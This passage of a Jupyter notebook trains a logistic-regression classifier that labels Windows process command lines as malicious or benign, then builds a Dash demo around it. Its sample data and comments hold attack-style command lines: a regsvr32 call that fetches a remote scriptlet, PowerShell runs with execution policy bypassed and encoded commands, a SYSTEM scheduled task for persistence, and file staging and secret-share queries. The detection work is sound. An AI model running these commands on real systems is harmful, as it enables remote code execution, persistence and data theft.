    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>token</th>\n",
       "      <th>weight</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>-executionpolicy</td>\n",
       "      <td>1.560938</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>bypass</td>\n",
       "      <td>1.560938</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>-c</td>\n",
       "      <td>1.528052</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>12</th>\n",
       "      <td>/c</td>\n",
       "      <td>1.449376</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>53</th>\n",
       "      <td>whoami</td>\n",
       "      <td>0.581469</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>24</th>\n",
       "      <td>arp</td>\n",
       "      <td>0.470794</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>23</th>\n",
       "      <td>-a</td>\n",
       "      <td>0.434295</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>50</th>\n",
       "      <td>net</td>\n",
       "      <td>0.383341</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>49</th>\n",
       "      <td>share</td>\n",
       "      <td>0.313210</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>62</th>\n",
       "      <td>-group</td>\n",
       "      <td>0.188534</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>63</th>\n",
       "      <td>-server</td>\n",
       "      <td>0.188534</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>64</th>\n",
       "      <td>my_group</td>\n",
       "      <td>0.188534</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>65</th>\n",
       "      <td>192.168.4.10</td>\n",
       "      <td>0.188534</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>66</th>\n",
       "      <td>http</td>\n",
       "      <td>0.188534</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>67</th>\n",
       "      <td>-v</td>\n",
       "      <td>0.188534</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>68</th>\n",
       "      <td>public</td>\n",
       "      <td>0.188534</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>61</th>\n",
       "      <td>8888</td>\n",
       "      <td>0.188103</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>16</th>\n",
       "      <td>select-object</td>\n",
       "      <td>0.110987</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>18</th>\n",
       "      <td>-force</td>\n",
       "      <td>0.067142</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>616</th>\n",
       "      <td>regsvr32.sct</td>\n",
       "      <td>0.064018</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                token    weight\n",
       "3    -executionpolicy  1.560938\n",
       "4              bypass  1.560938\n",
       "2                  -c  1.528052\n",
       "12                 /c  1.449376\n",
       "53             whoami  0.581469\n",
       "24                arp  0.470794\n",
       "23                 -a  0.434295\n",
       "50                net  0.383341\n",
       "49              share  0.313210\n",
       "62             -group  0.188534\n",
       "63            -server  0.188534\n",
       "64           my_group  0.188534\n",
       "65       192.168.4.10  0.188534\n",
       "66               http  0.188534\n",
       "67                 -v  0.188534\n",
       "68             public  0.188534\n",
       "61               8888  0.188103\n",
       "16      select-object  0.110987\n",
       "18             -force  0.067142\n",
       "616      regsvr32.sct  0.064018"
      ]
     },
     "execution_count": 37,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "en_lr_word_coefs.sort_values('weight', ascending=False).head(20)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "+ benign tokens"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>token</th>\n",
       "      <th>weight</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>files</td>\n",
       "      <td>-0.389325</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>program</td>\n",
       "      <td>-0.389325</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>x86</td>\n",
       "      <td>-0.337508</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>69</th>\n",
       "      <td>-embedding</td>\n",
       "      <td>-0.320953</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>application</td>\n",
       "      <td>-0.300781</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>chrome.exe</td>\n",
       "      <td>-0.300305</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>--type</td>\n",
       "      <td>-0.195051</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>110</th>\n",
       "      <td>microsoft.net</td>\n",
       "      <td>-0.175255</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>160</th>\n",
       "      <td>-servername</td>\n",
       "      <td>-0.158682</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>73</th>\n",
       "      <td>-forcev1</td>\n",
       "      <td>-0.131748</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>74</th>\n",
       "      <td>0xffffffff</td>\n",
       "      <td>-0.131748</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>75</th>\n",
       "      <td>conhost.exe</td>\n",
       "      <td>-0.131748</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>98</th>\n",
       "      <td>v4.0.30319</td>\n",
       "      <td>-0.130367</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>99</th>\n",
       "      <td>svchost.exe</td>\n",
       "      <td>-0.126945</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>100</th>\n",
       "      <td>-k</td>\n",
       "      <td>-0.126067</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>101</th>\n",
       "      <td>v1.0</td>\n",
       "      <td>-0.113789</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>187</th>\n",
       "      <td>taskhostw.exe</td>\n",
       "      <td>-0.095889</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>102</th>\n",
       "      <td>documents</td>\n",
       "      <td>-0.093001</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>104</th>\n",
       "      <td>-noexit</td>\n",
       "      <td>-0.090589</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>111</th>\n",
       "      <td>comppkgsrv.exe</td>\n",
       "      <td>-0.081659</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "              token    weight\n",
       "5             files -0.389325\n",
       "6           program -0.389325\n",
       "7               x86 -0.337508\n",
       "69       -embedding -0.320953\n",
       "8       application -0.300781\n",
       "9        chrome.exe -0.300305\n",
       "10           --type -0.195051\n",
       "110   microsoft.net -0.175255\n",
       "160     -servername -0.158682\n",
       "73         -forcev1 -0.131748\n",
       "74       0xffffffff -0.131748\n",
       "75      conhost.exe -0.131748\n",
       "98       v4.0.30319 -0.130367\n",
       "99      svchost.exe -0.126945\n",
       "100              -k -0.126067\n",
       "101            v1.0 -0.113789\n",
       "187   taskhostw.exe -0.095889\n",
       "102       documents -0.093001\n",
       "104         -noexit -0.090589\n",
       "111  comppkgsrv.exe -0.081659"
      ]
     },
     "execution_count": 38,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "en_lr_word_coefs.sort_values('weight', ascending=True).head(20)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Model Tuning\n",
    "\n",
    "+ Perform grid-search over TF-IDF and regularization parameters\n",
    "---"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[PipelineModel_6b9be63723ed,\n",
       " VectorAssembler_4d7767f200d6,\n",
       " LogisticRegressionModel: uid = LogisticRegression_8d91bcef6f5d, numClasses = 2, numFeatures = 1552]"
      ]
     },
     "execution_count": 40,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "en_lr_pipeline.stages"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[{Param(parent='LogisticRegression_8d91bcef6f5d', name='regParam', doc='regularization parameter (>= 0)'): 0.0,\n",
       "  Param(parent='LogisticRegression_8d91bcef6f5d', name='elasticNetParam', doc='the ElasticNet mixing parameter, in range [0, 1]. For alpha = 0, the penalty is an L2 penalty. For alpha = 1, it is an L1 penalty'): 0.0},\n",
       " {Param(parent='LogisticRegression_8d91bcef6f5d', name='regParam', doc='regularization parameter (>= 0)'): 0.0,\n",
       "  Param(parent='LogisticRegression_8d91bcef6f5d', name='elasticNetParam', doc='the ElasticNet mixing parameter, in range [0, 1]. For alpha = 0, the penalty is an L2 penalty. For alpha = 1, it is an L1 penalty'): 0.2},\n",
       " {Param(parent='LogisticRegression_8d91bcef6f5d', name='regParam', doc='regularization parameter (>= 0)'): 0.0,\n",
       "  Param(parent='LogisticRegression_8d91bcef6f5d', name='elasticNetParam', doc='the ElasticNet mixing parameter, in range [0, 1]. For alpha = 0, the penalty is an L2 penalty. For alpha = 1, it is an L1 penalty'): 0.4},\n",
       " {Param(parent='LogisticRegression_8d91bcef6f5d', name='regParam', doc='regularization parameter (>= 0)'): 0.01,\n",
       "  Param(parent='LogisticRegression_8d91bcef6f5d', name='elasticNetParam', doc='the ElasticNet mixing parameter, in range [0, 1]. For alpha = 0, the penalty is an L2 penalty. For alpha = 1, it is an L1 penalty'): 0.0},\n",
       " {Param(parent='LogisticRegression_8d91bcef6f5d', name='regParam', doc='regularization parameter (>= 0)'): 0.01,\n",
       "  Param(parent='LogisticRegression_8d91bcef6f5d', name='elasticNetParam', doc='the ElasticNet mixing parameter, in range [0, 1]. For alpha = 0, the penalty is an L2 penalty. For alpha = 1, it is an L1 penalty'): 0.2},\n",
       " {Param(parent='LogisticRegression_8d91bcef6f5d', name='regParam', doc='regularization parameter (>= 0)'): 0.01,\n",
       "  Param(parent='LogisticRegression_8d91bcef6f5d', name='elasticNetParam', doc='the ElasticNet mixing parameter, in range [0, 1]. For alpha = 0, the penalty is an L2 penalty. For alpha = 1, it is an L1 penalty'): 0.4},\n",
       " {Param(parent='LogisticRegression_8d91bcef6f5d', name='regParam', doc='regularization parameter (>= 0)'): 0.02,\n",
       "  Param(parent='LogisticRegression_8d91bcef6f5d', name='elasticNetParam', doc='the ElasticNet mixing parameter, in range [0, 1]. For alpha = 0, the penalty is an L2 penalty. For alpha = 1, it is an L1 penalty'): 0.0},\n",
       " {Param(parent='LogisticRegression_8d91bcef6f5d', name='regParam', doc='regularization parameter (>= 0)'): 0.02,\n",
       "  Param(parent='LogisticRegression_8d91bcef6f5d', name='elasticNetParam', doc='the ElasticNet mixing parameter, in range [0, 1]. For alpha = 0, the penalty is an L2 penalty. For alpha = 1, it is an L1 penalty'): 0.2},\n",
       " {Param(parent='LogisticRegression_8d91bcef6f5d', name='regParam', doc='regularization parameter (>= 0)'): 0.02,\n",
       "  Param(parent='LogisticRegression_8d91bcef6f5d', name='elasticNetParam', doc='the ElasticNet mixing parameter, in range [0, 1]. For alpha = 0, the penalty is an L2 penalty. For alpha = 1, it is an L1 penalty'): 0.4}]"
      ]
     },
     "execution_count": 42,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "paramGrid = (ParamGridBuilder() \n",
    "                 .addGrid(en_lr_pipeline.stages[2].regParam, [0.0, 0.01, 0.02]) \n",
    "                 .addGrid(en_lr_pipeline.stages[2].elasticNetParam, [0.0, 0.2, 0.4]) \n",
    "                 .build()\n",
    "            )\n",
    "paramGrid"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "+ Loop over each parameter mapping in paramGrid and fit model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Fitting model 0\n",
      "Fitting model 1\n",
      "Fitting model 2\n",
      "Fitting model 3\n",
      "Fitting model 4\n",
      "Fitting model 5\n",
      "Fitting model 6\n",
      "Fitting model 7\n",
      "Fitting model 8\n"
     ]
    }
   ],
   "source": [
    "models = []\n",
    "for g in range(len(paramGrid)):\n",
    "    print(\"Fitting model {}\".format(g))\n",
    "    _model = en_lr_estimator.fit(validation_df, paramGrid[g])\n",
    "    models.append(_model)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "+ Get the accuracy of each model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "metadata": {},
   "outputs": [],
   "source": [
    "accuracies = [m.\\\n",
    "    transform(validation_df).\\\n",
    "    select(F.avg(F.expr('float(class_label = prediction)')).alias('accuracy')).\\\n",
    "    first().\\\n",
    "    accuracy for m in models]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[0.999874419188748,\n",
       " 0.999874419188748,\n",
       " 0.999874419188748,\n",
       " 0.9989011679015446,\n",
       " 0.9989011679015446,\n",
       " 0.9996860479718699,\n",
       " 0.9989011679015446,\n",
       " 0.9989011679015446,\n",
       " 0.9993407007409267]"
      ]
     },
     "execution_count": 45,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "accuracies"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Cross validation \n",
    "+ test generalization performance on test dataset\n",
    "\n",
    "---"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0.999874419188748"
      ]
     },
     "execution_count": 46,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import numpy as np\n",
    "best_model_idx = np.argmax(accuracies)\n",
    "best_model = models[best_model_idx]\n",
    "accuracies[best_model_idx]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{Param(parent='LogisticRegression_8d91bcef6f5d', name='regParam', doc='regularization parameter (>= 0)'): 0.0,\n",
       " Param(parent='LogisticRegression_8d91bcef6f5d', name='elasticNetParam', doc='the ElasticNet mixing parameter, in range [0, 1]. For alpha = 0, the penalty is an L2 penalty. For alpha = 1, it is an L1 penalty'): 0.0}"
      ]
     },
     "execution_count": 47,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "paramGrid[best_model_idx]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+------------------+\n",
      "|          accuracy|\n",
      "+------------------+\n",
      "|0.9998129092609915|\n",
      "+------------------+\n",
      "\n"
     ]
    }
   ],
   "source": [
    "best_model.\\\n",
    "    transform(testing_df).\\\n",
    "    select(F.avg(F.expr('float(class_label = prediction)')).alias('accuracy')).\\\n",
    "    show()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Plotly Dash Code \n",
    "---"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "metadata": {},
   "outputs": [],
   "source": [
    "common_strings = ['windows', 'system32', 'cmd.exe', 'sandcat.exe', 'c', 'windowspowershell', 'powershell.exe', '']\n",
    "\n",
    "import re\n",
    "# TODO: replace this with cleaning steps at the top of code\n",
    "def demo_clean_input(s):\n",
    "    pattern = re.compile(r\"\"\"\n",
    "        [:|\"?']\n",
    "        | --field-trial-handle=.*\\d+\n",
    "        | //.*com(/.*)/\n",
    "        | \\s*\"\\s*\n",
    "        | \\{.*\\}\n",
    "        | [=;(),]\n",
    "        | \\\\\n",
    "        | //\n",
    "        | \\s+\\.\\s+ \n",
    "        | $.\n",
    "        | $_.\n",
    "    \"\"\", re.VERBOSE)\n",
    "    \n",
    "    return ','.join([x.lower() for x in re.sub(pattern, ' ', s).split() if x.lower() not in common_strings and len(x) >= 2])\n",
    "\n",
    "# demo_clean_input(\"C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s NetSetupSvc\")\n",
    "# demo_clean_input(r'//download.sysinternals.com/files/pstools.zip')\n",
    "# demo_clean_input(r'C:\\Windows\\system32\\regsvr32.exe\" \"C:\\Windows\\system32\\regsvr32.exe\" /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll')\n",
    "# demo_clean_input(r'powershell.exe -ExecutionPolicy Bypass -C \"Get-WmiObject -Class Win32_UserAccount\"')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_coefs(tokens):\n",
    "    \"\"\" get the coefficient for tokens passed from GUI and returns as string \"\"\"\n",
    "    \n",
    "    _format = \"{}: *{}*\\n\"\n",
    "    s = \"\"\n",
    "\n",
    "    token_coefs = []\n",
    "    for token in tokens.split(','):\n",
    "        try:\n",
    "            weight = round(en_lr_word_coefs.loc[en_lr_word_coefs.loc[:, 'token'] == token, 'weight'].values[0], 2)\n",
    "            s += _format.format(token, weight)\n",
    "        except:\n",
    "            weight = 0.0  # token is not in vocabulary, therefore return 0 for weight\n",
    "            s += _format.format(token, weight)   \n",
    "    return s\n",
    "\n",
    "# get_coefs('cmd.exe,/c,/t')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "metadata": {},
   "outputs": [],
   "source": [
    "def spark_code(s):\n",
    "    \"\"\" tokenizes the input and calls the existing feature and prediction pipelines to transform the input \"\"\"\n",
    "    \n",
    "    # create tokens\n",
    "    tokens = demo_clean_input(s)\n",
    "    print(tokens)\n",
    "    \n",
    "    # create dataframe\n",
    "    _schema = T.StructType([T.StructField('cmd_line_tokens', T.StringType(), True)])         \n",
    "    myrow = Row(tokens)\n",
    "    text_df = spark.createDataFrame([myrow], schema=_schema)\n",
    "    text_df = text_df.withColumn('cmd_line_tokens', F.split(col('cmd_line_tokens'), ','))\n",
    "        \n",
    "    #transform features using existing pipelines\n",
    "    features = en_lr_pipeline.transform(text_df)\n",
    "#     print(features.take(1))\n",
    "    \n",
    "    _features = features.select('cmd_line_tokens').rdd.take(1)[0]['cmd_line_tokens']\n",
    "    prediction = features.select('prediction').rdd.take(1)[0]['prediction']\n",
    "    probability = features.select('probability').rdd.take(1)[0]['probability']\n",
    "    \n",
    "    coefs = get_coefs(tokens)\n",
    "    \n",
    "    result = \"\"\"\n",
    "    Tokens: {} \\n \n",
    "    Probability: {} \\n \n",
    "    Prediction: {} \\n \n",
    "    {}\n",
    "    \"\"\"\n",
    "    \n",
    "    if prediction == 0:\n",
    "        return result.format(_features, probability, prediction, \"*** Benign ***\"), coefs\n",
    "    else:\n",
    "        return result.format(_features, probability, prediction, \"*** Malicious ***\"), coefs\n",
    "                         \n",
    "# spark_code('C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s NetSetupSvc')\n",
    "# spark_code(r'\"powershell.exe -ExecutionPolicy Bypass -C \"\"Compress-Archive -Path C:\\Users\\win10-user3\\staged-DestinationPath C:\\Users\\win10-user3\\staged.zip -Force;ls C:\\Users\\win10-user3\\staged.zip | foreach {$_.FullName} | select')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import dash\n",
    "import dash_table\n",
    "import dash_core_components as dcc\n",
    "import dash_html_components as html\n",
    "from jupyterlab_dash import AppViewer\n",
    "from dash.dependencies import Input, Output\n",
    "\n",
    "external_stylesheets = ['https://codepen.io/chriddyp/pen/bWLwgP.css']\n",
    "\n",
    "viewer = AppViewer()\n",
    "\n",
    "app = dash.Dash(name=__name__, external_stylesheets=external_stylesheets)\n",
    "\n",
    "markdown_text = '''\n",
    "### Windows process command-line classifier\n",
    "Please copy and paste your log in the box below\n",
    "'''\n",
    "\n",
    "sample_input_data = r'''\n",
    "### Example malicious logs \n",
    "+ C:\\Windows\\system32\\regsvr32.exe\" /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll\n",
    "+ powershell.exe -ExecutionPolicy Bypass -C \"New-Item -Path \\\".\\\" -Name \\\"staged\\\" -ItemType \\\"directory\\\" -Force | foreach {$_.FullName} | Select-Object\"\n",
    "+ cmd.exe /C \"net share\"\n",
    "### Example benign logs \n",
    "+ C:\\Windows\\system32\\dllhost.exe /Processid:{B2FEB3AD-8AE6-42E7-B2E4-60609573B404}\n",
    "+ C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s SENS \n",
    "+ C:\\Windows\\System32\\Upfc.exe /launchtype boot /cv 09o3CnnAskG8AMTNUwkQhQ.0\n",
    "### Example logs not in dataset\n",
    "+ cmd.exe /c schtasks /create /tn \"Resume Viewer Update Checker\" /tr \"powershell.exe -nop -exec bypass -EncodedCommand $pcode\" /sc ONLOGON /RU SYSTEM'\n",
    "+ cmd.exe /c dir /s /b \\\\\\\\FILE001\\\\secrets\n",
    "+ C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\" -nop -exec bypass -EncodedCommand SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQA\n",
    "+ cmd.exe /c reg query \"\\\\\\\\\\\\\\\\FILE001\\\\secrets\\\\hklm\\\\system\\\\currentcontrolset\\\\control\\\\terminal server\n",
    "'''\n",
    "\n",
    "app.layout = html.Div([\n",
    "    html.Div([\n",
    "        html.Div([\n",
    "            dcc.Markdown(children=markdown_text),\n",
    "            dcc.Textarea(id='input', value='C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s NetSetupSvc', style={'height': '50px', 'width': '50%'}),\n",
    "            \n",
    "        html.Div([html.Button(children='Submit', id='button', n_clicks=0)], style={'margin': '2px'}),\n",
    "            \n",
    "        html.Div([\n",
    "            dcc.Textarea(id='output', value='', style={'height': '175px', 'width': '50%'}),\n",
    "            dcc.Textarea(id='coefs', value='', style={'height': '175px', 'width': '25%'})\n",
    "        ]),\n",
    "            dcc.Markdown(children=sample_input_data)\n",
    "        ])\n",
    "    ])\n",
    "])\n",
    "    \n",
    "@app.callback(\n",
    "    [Output(component_id='output', component_property='value'),  # set output component on reactive change\n",
    "    Output(component_id='coefs', component_property='value')],\n",
    "    [Input(component_id='button', component_property='n_clicks')],  #  reactive input comes from button press\n",
    "    [dash.dependencies.State('input', 'value')]\n",
    ")\n",
    "def on_click(n_clicks, value):\n",
    "    # call pyspark logic from here\n",
    "    return spark_code(value)\n",
    "    \n",
    "\n",
    "viewer.show(app)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
